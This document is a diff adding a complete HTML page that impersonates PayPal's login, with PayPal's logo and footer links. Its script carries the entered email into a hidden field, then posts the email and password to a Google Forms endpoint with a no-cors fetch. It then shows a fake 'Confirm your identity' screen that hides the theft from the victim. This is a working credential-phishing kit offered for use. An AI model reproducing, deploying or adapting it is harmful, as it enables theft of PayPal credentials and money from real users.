@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal Payment</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container, .password-container, .verification-container {
+            background-color: white;
+            padding: 40px 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 100%;
+            display: none; /* Start hidden */
+            opacity: 0;
+            transition: opacity 0.5s ease-in-out;
+        }
+        .login-container.active, .password-container.active, .verification-container.active {
+            display: block; /* Show only the active container */
+            opacity: 1;
+        }
+        .login-container img, .password-container img, .verification-container img {
+            width: 50px;
+            margin-bottom: 20px;
+        }
+        .login-container input, .password-container input {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+            color: #333;
+            transition: all 0.2s;
+        }
+        .login-container input:focus, .password-container input:focus {
+            border-color: #0070ba;
+            outline: none;
+        }
+        .forgot-link {
+            display: block;
+            text-align: left;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #0070ba;
+            text-decoration: none;
+        }
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background-color: #0070ba;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .btn-primary:hover {
+            background-color: #005a9e;
+        }
+        .divider {
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            color: #888;
+        }
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #ddd;
+        }
+        .divider::before {
+            margin-right: 10px;
+        }
+        .divider::after {
+            margin-left: 10px;
+        }
+        .btn-secondary {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #000000;
+            color: #000000;
+            background-color: white;
+            font-weight: bold;
+            border-radius: 30px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .btn-secondary:hover {
+            background-color: #f5f5f5;
+        }
+        .language-selector {
+            margin: 20px 0;
+            font-size: 14px;
+            color: #333;
+        }
+        .language-selector a {
+            margin: 0 5px;
+            color: #545d68;
+            text-decoration: none;
+        }
+        .language-selector a:hover {
+            text-decoration: underline;
+        }
+        footer {
+            font-size: 12px;
+            color: #666;
+            margin-top: 20px;
+        }
+        footer a {
+            color: #545d68;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+        .verification-container h1 {
+            font-weight: bold;
+            margin-bottom: 15px;
+            font-size: 18px;
+        }
+        .verification-container p {
+            font-size: 14px;
+            margin-bottom: 40px;
+        }
+        .verification-container a {
+            font-size: 14px;
+            color: #0070ba;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Login Container -->
+    <div class="login-container active">
+        <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo">
+        <form id="login-form">
+            <input type="email" name="email" id="email" placeholder="Email or mobile number" required>
+            <a href="#" class="forgot-link">Forgot email?</a>
+            <button type="button" class="btn-primary" id="next-btn">Next</button>
+        </form>
+        <div class="divider">or</div>
+        <button class="btn-secondary">Sign Up</button>
+        <div class="language-selector">
+            <a href="#">English</a> | 
+            <a href="#">Français</a> | 
+            <a href="#">Español</a> | 
+            <a href="#">中文</a>
+        </div>
+        <footer>
+            <a href="#">Contact Us</a> | 
+            <a href="#">Privacy</a> | 
+            <a href="#">Legal</a> | 
+            <a href="#">Policy Updates</a> | 
+            <a href="#">Worldwide</a>
+        </footer>
+    </div>
+
+    <!-- Password Container -->
+    <div class="password-container">
+        <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo">
+        <form id="password-form" action="https://docs.google.com/forms/d/e/1FAIpQLSep87bO0F05gYQG9f6X3f-8Ca7-lQ4SrU1jbs_pR_a89lNhxA/formResponse" method="POST">
+            <input type="hidden" name="entry.2053710549" id="email-hidden">
+            <input type="password" name="entry.1947088558" placeholder="Password" required>
+            <a href="#" class="forgot-link">Forgot password?</a>
+            <button type="submit" class="btn-primary">Log In</button>
+        </form>
+        <div class="divider">or</div>
+        <button class="btn-secondary">Sign Up</button>
+        <div class="language-selector">
+            <a href="#">English</a> | 
+            <a href="#">Français</a> | 
+            <a href="#">Español</a> | 
+            <a href="#">中文</a>
+        </div>
+        <footer>
+            <a href="#">Contact Us</a> | 
+            <a href="#">Privacy</a> | 
+            <a href="#">Legal</a> | 
+            <a href="#">Policy Updates</a> | 
+            <a href="#">Worldwide</a>
+        </footer>
+    </div>
+
+    <!-- Verification Container -->
+    <div class="verification-container">
+        <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo">
+        <h1>Confirm your identity</h1>
+        <p>Open the PayPal app on your phone and follow the instructions to proceed.</p>
+        <a href="#">Need more options?</a>
+    </div>
+
+    <script>
+        document.getElementById('next-btn').addEventListener('click', function(event) {
+            event.preventDefault(); // Prevent default form submission
+            
+            const email = document.getElementById('email').value;
+            document.getElementById('email-hidden').value = email;
+            
+            document.querySelector('.login-container').classList.remove('active');
+            document.querySelector('.password-container').classList.add('active');
+        });
+
+        document.getElementById('password-form').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            const form = event.target;
+            const formData = new FormData(form);
+
+            // Submit form data to Google Forms
+            fetch(form.action, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors' // To avoid CORS issues with Google Forms
+            }).then(() => {
+                document.querySelector('.password-container').classList.remove('active');
+                document.querySelector('.verification-container').classList.add('active');
+            }).catch((error) => {
+                console.error('Form submission failed:', error);
+            });
+        });
+    </script>
+</body>
